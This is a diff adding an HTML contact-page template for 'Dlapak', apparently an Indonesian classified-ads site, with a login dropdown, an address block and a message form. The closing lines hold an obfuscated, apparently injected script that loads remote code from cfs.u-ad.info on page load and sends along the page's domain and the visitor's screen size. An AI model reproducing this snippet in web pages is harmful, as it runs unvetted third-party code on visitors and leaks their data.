@@ -1,0 +1,197 @@
+
+<!DOCTYPE html>
+<html>  
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="robots" content="index, follow">
+        <title>Dlapak - General Listing Template</title>
+        <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:regular,700,600&amp;latin" type="text/css" />
+        <!-- Essential styles -->
+        <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css" type="text/css">
+        <link rel="stylesheet" href="assets/plugins/font-awesome/css/font-awesome.css" type="text/css"> 
+
+        <!-- Dlapak styles -->
+        <link id="theme_style" type="text/css" href="assets/css/style1.css" rel="stylesheet" media="screen">
+
+
+        <!-- Favicon -->
+        <link href="assets/img/favicon.png" rel="icon" type="image/png">
+
+        <!-- Assets -->
+        <link rel="stylesheet" href="assets/plugins/owl-carousel/owl.carousel.css">
+        <link rel="stylesheet" href="assets/plugins/owl-carousel/owl.theme.css">
+        <link rel="stylesheet" href="assets/plugins/flexslider/flexslider.css" type="text/css" media="screen" />
+
+        <!-- JS Library -->
+        <script src="assets/js/jquery.js"></script>
+
+    </head>
+    <body>
+        <div class="wrapper">
+            <header  class="navbar navbar-default navbar-fixed-top navbar-top">
+                <div class="container">
+                    <div class="navbar-header">
+                        <button data-target=".navbar-collapse" data-toggle="collapse" class="navbar-toggle" type="button">
+                            <span class="sr-only">Toggle navigation</span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </button>
+                        <a href="index.html" class="navbar-brand"><span class="logo"><i class="fa fa-recycle"></i> Dlapak</span></a>
+                    </div>
+
+                    <div class="navbar-collapse collapse">
+                        <ul class="nav navbar-nav navbar-right">
+                            <li class="new-ads"><a href="posting.html" class="btn btn-ads btn-block">Advertise</a></li>
+                            <li><a href="signup.html">Signup</a></li>
+                            <li class="dropdown">
+                                <a class="dropdown-toggle" href="#" data-toggle="dropdown"><strong class="caret"></strong>&nbsp;Pages</a>
+                                <ul class="dropdown-menu">
+                                    <li><a href="akun.html">My Ads</a></li>
+                                    <li><a href="posting.html">Create Ads</a></li>
+                                    <li><a href="profile.html">My Profile</a></li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a class="dropdown-toggle" href="#" data-toggle="dropdown"><i class="fa fa-user"></i> <strong class="caret"></strong>&nbsp;</a>
+                                <div class="dropdown-menu dropdown-login" style="padding:15px;min-width:250px">
+                                    <form>                       
+                                        <div class="form-group">
+                                            <div class="input-group">
+                                                <span class="input-group-addon addon-login"><i class="fa fa-user"></i></span>
+                                                <input type="text" placeholder="Username or email" required="required" class="form-control input-login">                                            
+                                            </div>
+                                        </div>
+                                        <div class="form-group">
+                                            <div class="input-group">
+                                                <span class="input-group-addon addon-login"><i class="addon fa fa-lock"></i></span>
+                                                <input type="password" placeholder="Password" required="required" class="form-control input-login">                                            
+                                            </div>
+                                        </div>
+                                        <div class="form-group">
+                                            <div class="checkbox">
+                                                <label class="string optional" for="user_remember_me">
+                                                    <input type="checkbox" id="user_remember_me" style="">
+                                                    Remember me
+                                                </label>
+                                            </div>
+                                        </div>
+                                        <input type="submit" class="btn btn-custom btn-block" value="Sign In">
+                                        <a href="lupa.html" class="btn-block text-center">Forgot password?</a>
+                                    </form>                                    
+                                </div>
+                            </li>
+
+                        </ul>
+                    </div>
+                </div>
+            </header>
+            <section class="main">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <ul class="breadcrumb pull-left">
+                                <li><a href="index.html">Home</a></li>
+                                <li>Kontak kami</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div class="map">
+                                <img src="assets/img/general/map.png" alt="" class="img-responsive">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-md-4 col-sm-4">
+                            <div class="widget">
+                                <div class="widget-header">
+                                    <h3>Office Address</h3>
+                                </div>
+                                <div class="widget-body">
+                                    <address>
+                                        <strong>Dlingo Putra, Inc.</strong><br/>
+                                        256 Bantul, Yogyakarta, ID 55783<br/>
+                                        email@example.com<br/>
+                                        http://website.com<br/>
+                                        Phone : 234-3453 243
+                                    </address>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-8 col-sm-8">
+                            <div class="row">
+                                <div class="col-md-12">
+                                    <div class="widget">
+                                        <div class="widget-header">
+                                            <h3>Send Message</h3>
+                                        </div>
+                                        <div class="widget-body">
+                                            <form method="POST">
+                                                <p>If you have any question, feel free to send message us</p>
+                                                <div class="row">
+                                                    <div class="col-xs-4">
+                                                        <input type="text" placeholder="Name" class="form-control input-lg">
+                                                    </div>
+                                                    <div class="col-xs-4">
+                                                        <input type="text" placeholder="Email" class="form-control input-lg">
+                                                    </div>
+                                                    <div class="col-xs-4">
+                                                        <input type="text" placeholder="Website" class="form-control input-lg">
+                                                    </div>
+                                                </div>
+                                                <br>
+                                                <div class="row">
+                                                    <div class="col-xs-12">
+                                                        <textarea rows="5" placeholder="Write message here..." class="form-control"></textarea>
+                                                    </div>
+                                                </div>
+                                                <br>
+                                                <div class="row">
+                                                    <div class="col-xs-12">
+                                                        <button class="btn btn-lg btn-custom pull-right">Submit</button>
+                                                    </div>
+                                                </div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <div class="footer">
+                <div class="container">
+                <ul class="pull-left footer-menu">
+                    <li>
+                        <a href="index.html"> Home </a>
+                        <a href="about.html"> Tentang kami </a>
+                        <a href="kontak.html"> Kontak kami </a>
+                    </li>
+                </ul>
+                <ul class="pull-right footer-menu">
+                    <li> &copy; 2015 Dlapak </li>
+                </ul>
+                </div>
+            </div>
+        </div>
+        <!-- Essentials -->
+        <script src="assets/bootstrap/js/bootstrap.min.js"></script>
+        <script src="assets/plugins/owl-carousel/owl.carousel.js"></script>
+        <script src="assets/plugins/counter/jquery.countTo.js"></script>
+        <script defer src="assets/plugins/flexslider/jquery.flexslider.js"></script>
+        <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-68907527-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnFULivSOccLpj7jYuayEOreStj1RIT919zwfn5Pg3mtOQ7I8IZw1UXh3aZuVaKDQZCOEPMgEM2aFdtpviBgLahQhhHhLeBbZispHtv5t%2fQOZ4oCCWERld79w8WY9zu3A2Ft%2bI0oxiugJvVSi0eokq6CkgEwczW%2fNkyL1e2W6VpdgBVj%2b%2b0dTLlnP7ezugwCzf6LMhqUWmfil%2bvvPdcknQA8sihojnDXubj1T4kBwgqlaxte%2fhTrlMcfad341HAlWqZ9ArLWy0oylV3aydaNC%2bOI7lPF5fPuuPR0s731uesVoMkPcAaCKXZLXRBfauIKH0708ZfjBuuisjk7v50Xn6ladOuuk4htqzKtaXPDl5EBH5XkP7oaXWX0ZUfzRGkDHrOpHZSK3SFnel%2f85CpIXBYNDB2SFGLYOs6O72cGXV%2bwNQYEEH7SP8xrKnbD6Chp9ZtdVtLspODNIJqFQw8p7TgE6KVvN7U86WF3JLugdd8KFuhVqlsa0q43LPV6%2fLnIe9AIKPRod1DjDe0%2fMWorhMOPvnePTf69izSeKofQ%2bUH0fz1nNctVkTNA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html> 
